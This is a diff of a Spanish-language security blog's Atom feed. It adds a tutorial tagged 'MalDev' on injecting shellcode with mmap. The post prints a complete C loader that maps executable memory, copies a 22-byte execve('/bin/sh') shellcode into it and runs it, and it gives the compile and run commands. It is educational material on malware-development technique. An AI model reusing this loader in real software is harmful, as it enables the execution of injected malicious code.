@@ -1,5 +1,400 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-06-08T10:55:52-06:00</updated><id>/feed.xml</id><title type="html">c4rta</title><subtitle>Soy Omar, un radioaficionado amante de la ciberseguridad
-</subtitle><author><name>Omar</name></author><entry><title type="html">Un Poco de Pentesting Web - SSTI en Jinja2</title><link href="/blog/posts/2023-05-29-UPDPW-ssti/" rel="alternate" type="text/html" title="Un Poco de Pentesting Web - SSTI en Jinja2" /><published>2023-05-29T00:00:00-06:00</published><updated>2023-05-31T19:55:38-06:00</updated><id>/blog/posts/UPDPW-ssti</id><content type="html" xml:base="/blog/posts/2023-05-29-UPDPW-ssti/">&lt;center style=&quot;font-size: 14px&quot; class=&quot;lead&quot;&gt;(soy ese)&lt;/center&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-06-10T16:28:56-06:00</updated><id>/feed.xml</id><title type="html">c4rta</title><subtitle>Soy Omar, un radioaficionado amante de la ciberseguridad
+</subtitle><author><name>Omar</name></author><entry><title type="html">Inyeccion de shellcodes usando la syscall mmap</title><link href="/blog/posts/2023-06-10-inyeccion-shellcodes-mmap/" rel="alternate" type="text/html" title="Inyeccion de shellcodes usando la syscall mmap" /><published>2023-06-10T00:00:00-06:00</published><updated>2023-06-10T16:28:56-06:00</updated><id>/blog/posts/inyeccion-shellcodes-mmap</id><content type="html" xml:base="/blog/posts/2023-06-10-inyeccion-shellcodes-mmap/">&lt;h2 id=&quot;mmap&quot;&gt;mmap&lt;/h2&gt;
+
+&lt;p&gt;mmap es una syscall y una funcion incorporada en el header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys/mman.h&lt;/code&gt; la cual permite asignar o mapear memoria dentro del espacio de direcciones virtuales de un proceso, mmap regresa un puntero void (void *), la estructura es:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;off_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;void *addr&lt;/strong&gt;: Es la direccion desde donde se va a asignar la memoria, esta direccion se la podemos asignar manualmente, o en todo caso de que le pogamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;, le estamos diciendo al kernel que asigne la memoria, regularmente  la asigna a direcciones cercanas pero mayores a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/sys/vm/mmap_min_addr&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;size_t length&lt;/strong&gt;: Es la longitud en bytes de la memoria que se va a asignar&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;int prot&lt;/strong&gt;: Se refiera a con que protecciones vamos a asignar la memoria, hay varias
+    &lt;ul&gt;
+      &lt;li&gt;PROT_EXEC: La memoria es ejecutable&lt;/li&gt;
+      &lt;li&gt;PROT_READ: La memoria tiene permisos de lectura&lt;/li&gt;
+      &lt;li&gt;PROT_WRIT: La memoria tiene permisos de escritura&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;int flags&lt;/strong&gt;: Determina si las actualizaciones de la memoria, son visibles para otras asignaciones de memoria dentro de la misma region de la memoria, existe muchas flags, asi que puedes leer cada una de ellas &lt;a href=&quot;https://man7.org/linux/man-pages/man2/mmap.2.html&quot;&gt;aqui&lt;/a&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;int fd&lt;/strong&gt;: Es el descriptor de archivos el cual sera asginado&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;off_t offset&lt;/strong&gt;: Es el desplazamiento desde donde se va a asignar la memoria&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Una vez sabiendo eso ya podemos comenzar a tirar codigo&lt;/p&gt;
+
+&lt;h2 id=&quot;desarrollo-del-programa&quot;&gt;Desarrollo del programa&lt;/h2&gt;
+
+&lt;p&gt;Primero debemos de empezar a declarar nuestra shellcode como una cadena de caracteres de esta manera:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;sys/mman.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;La shellcode ejecutara un /bin/sh&lt;/p&gt;
+
+&lt;p&gt;Dentro de una funcion, empezare a declarar todo el codigo de la inyeccion, primero debemos sacar el tamaño en bytes de la shellcode, ya que es uno de los argumentos que recibe &lt;strong&gt;mmap&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ejecutar_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tam_shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Observa que se le esta agregando un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;- 1&lt;/code&gt;, esto es para quitarle el byte nulo.&lt;/p&gt;
+
+&lt;p&gt;Despues haremos el llamado a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mmap&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ejecutar_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tam_shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_mem&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;tam_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;PROT_READ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROT_WRITE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROT_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAP_PRIVATE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAP_ANONYMOUS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;La direccion donde se va a asignar la memoria es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt; para que el kernel la elija, el tamaño de la memoria a asignar es el tamaño de la shellcode, en las flag le decimos que la memoria se asigne con permisos de lectura, escritura, y ejecucion, con el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-1&lt;/code&gt; le estamos diciendo que al descriptor de archivos que no se requiere un archivo ya existente y que solo asigne memoria, y te podras dar cuenta de algo, estamos usando la flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MAP_ANONYMOUS + MAP_PRIVATE&lt;/code&gt;, con esas flags le estamos indicando que la asignacion sera simplemente un bloque de memoria en ceros (por eso mismo el offset es 0), la cual estara lista de usar, ademas de ser privada, es decir, estara excluida de otras asignaciones de memoria dentro de la misma region de memoria&lt;/p&gt;
+
+&lt;p&gt;Aqui dibuje un diagrama de la asgnacion de memoria con mmap tomando en cuenta el ejemplo&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/mmap_injection/mmap.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo que se ve a la derecha es la memoria virtual de un proceso (sin entrar tanto en detalle), te podras dar cuenta que la memoria de la shellcode se asigno dentro de una seccion que se llama &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Memory Mapping&lt;/code&gt;, en esta seccion se asigna memoria para las librerias compartidas y dinamicas, ademas de las asignaciones de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mmap&lt;/code&gt;, pero ojo, para que una asignacion de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mmap&lt;/code&gt; recida en esta seccion, debe de ir con la flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MAP_ANONYMOUS&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Resumidamente el diagrama seria algo asi:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Usamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sizeof()&lt;/code&gt; para obtener el tamaño de la shellcode y lo guardamos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tam_shellcode&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Asignamos memoria con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mmap&lt;/code&gt; donde el tamaño es lo que tiene &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tam_shellcode&lt;/code&gt; (22 bytes)&lt;/li&gt;
+  &lt;li&gt;Usamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MAP_ANONYMOUS&lt;/code&gt; para indicarle que la asignacion se haga dentro de la seccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Memory Mapping&lt;/code&gt;,&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;una vez que asignamos memoria para la shellcode, debemos de copiar la shellcode en esa memoria, eso lo hacemos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt;, memcpy se usa para copiar cierta cantidad de bytes desde un origen a un destino.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tam_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En nuestro ejemplo le estamos diciendo que copie 22 bytes (tam_shellcode) del origen (shellcode), hacia la memoria que asignamos (shellcode_mem), y con esta operacion, nuestra shellcode ya estara escrita en la memoria que asigamos con mmap.&lt;/p&gt;
+
+&lt;p&gt;Ahora debemos de invocar a la shellcode, para eso realizamos esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Primero definimos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_ptr&lt;/code&gt; como un puntero a una funcion, con el fin de asignar a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_ptr&lt;/code&gt; la direccion de memora que contiene &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_mem&lt;/code&gt; ya que cabe recordar que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_mem&lt;/code&gt; contiene la direccion de memoria desde donde se asigno la shellcode, que es un tipo void *&lt;/p&gt;
+
+&lt;p&gt;Despues con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;void (*)()&lt;/code&gt; le estamos diciendo que defina un puntero a una funcion que no recibe argumentos ni tampoco retorne nada, esto con el fin de que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_mem&lt;/code&gt; sea interpretado como un puntero hacia esa funcion, entonces a travez de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_ptr&lt;/code&gt; podemos mandar a llamar a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_mem&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Asi que cuando se haga un llamado a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_ptr();&lt;/code&gt;, ejecutara lo que esta almacenado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode_mem&lt;/code&gt;, lo cual es la shellcode:D&lt;/p&gt;
+
+&lt;p&gt;Despues solo queda a mandar a llamar a la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ejecutar_shellcode()&lt;/code&gt; desde el main:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ejecutar_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y el codigo completo queda asi:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;sys/mman.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//bin/sh&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ejecutar_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tam_shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_mem&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;tam_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;PROT_READ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROT_WRITE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROT_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAP_PRIVATE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAP_ANONYMOUS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tam_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Tamaño de la shellcode: %zu bytes&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tam_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Shellcode asignada desde la direccion: %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;shellcode_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ejecutar_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Solo queda compilar y ejectuar&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -o inyeccion_mmap inyeccion_mmap.c
+./inyeccion_mmap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="MalDev" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/mmap_injection/waifu.gif" /><media:content medium="image" url="/assets/img/mmap_injection/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Shellcodes - syscall write() y execve(bin/sh)</title><link href="/blog/posts/2023-06-07-maldev-shellcodes/" rel="alternate" type="text/html" title="Shellcodes - syscall write() y execve(bin/sh)" /><published>2023-06-07T00:00:00-06:00</published><updated>2023-06-07T19:25:45-06:00</updated><id>/blog/posts/maldev-shellcodes</id><content type="html" xml:base="/blog/posts/2023-06-07-maldev-shellcodes/">&lt;p&gt;Que onda, esta vez te voy a enseñar a como puedes crear shellcodes, te enseñare como crear una usando la syscall write() y otra usando execve() para ejecutar bin/sh&lt;/p&gt;
+
+&lt;h2 id=&quot;shellcodes&quot;&gt;Shellcodes&lt;/h2&gt;
+
+&lt;p&gt;Las shellcodes son un conjunto de instrucciones de bajo nivel (ensamblador) que se inyectan en la memoria de un programa con el fin de ejecutar codigo&lt;/p&gt;
+
